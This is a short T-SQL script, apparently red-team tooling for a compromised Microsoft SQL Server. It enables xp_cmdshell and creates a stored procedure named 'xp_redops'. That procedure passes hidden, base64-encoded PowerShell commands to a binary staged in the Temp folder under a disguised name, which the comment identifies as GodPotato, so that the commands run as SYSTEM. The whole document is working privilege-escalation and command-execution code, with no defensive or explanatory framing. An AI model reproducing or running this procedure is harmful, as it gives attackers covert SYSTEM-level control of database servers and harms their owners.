-- custom stored procedure wrapping xp_cmdshell; runs PowerShell as SYSTEM via GodPotato
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
GO
CREATE PROCEDURE dbo.xp_redops @cmd NVARCHAR(4000)
AS
BEGIN
  DECLARE @full NVARCHAR(4000);
  SET @full = N'C:\Windows\Temp\dbsvc.bin -cmd "powershell.exe -nop -w hidden -enc ' + @cmd + N'"';
  EXEC master..xp_cmdshell @full;
END
GO
